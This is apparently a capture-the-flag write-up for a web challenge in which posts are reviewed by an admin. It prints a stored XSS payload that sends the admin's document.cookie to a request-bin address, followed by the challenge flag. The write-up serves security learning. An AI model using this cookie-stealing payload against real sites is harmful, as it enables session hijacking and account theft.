# Apporach
- Upon first glance, we see that the target website `https://govagriculture.web.ctfcompetition.com/` provides a form submission area, and the admin page. However, the admin page link redirects user back to the home page.
- When I tried to submit a test post, I was given the following message "Your post was submitted for review. Administator will take a look shortly". This hints to an XSS vulnerability that requaire us to steal the cookie of the admin.
- To achieve that, I found an online HTTP request bin, and used that link to build the following exploit:
```javascript
hi <img id='on'> <script>document.getElementById("on").src = "ADDRESS?session="+document.cookie</script>
```
- Upon inspecting the HTTP request sent to the request bin, I was able to see the flag
# Flag
CTF{8aaa2f34b392b415601804c2f5f0f24e}
